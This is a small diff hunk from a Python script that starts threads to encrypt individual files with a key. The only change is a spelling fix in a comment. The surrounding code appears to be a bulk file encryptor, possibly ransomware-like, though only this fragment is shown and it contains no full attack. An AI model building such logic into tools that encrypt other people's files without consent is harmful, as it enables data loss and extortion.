@@ -124,7 +124,7 @@ if __name__ == '__main__':  # Check IF Script IS Excuted By User.
                                             if len(threading.enumerate()) < MaxThread: # IF your Worker List is Free
                                     
                                                 EncrypterObj = D_E_ncrypt(FilePath, Box) # Pass in file name And key 
-                                                threading.Thread(target=EncrypterObj.FileE, args=()).start() # to Encypte. 
+                                                threading.Thread(target=EncrypterObj.FileE, args=()).start() # to Encypt. 
                                     
                                                 break                                                        # Break Out
                             
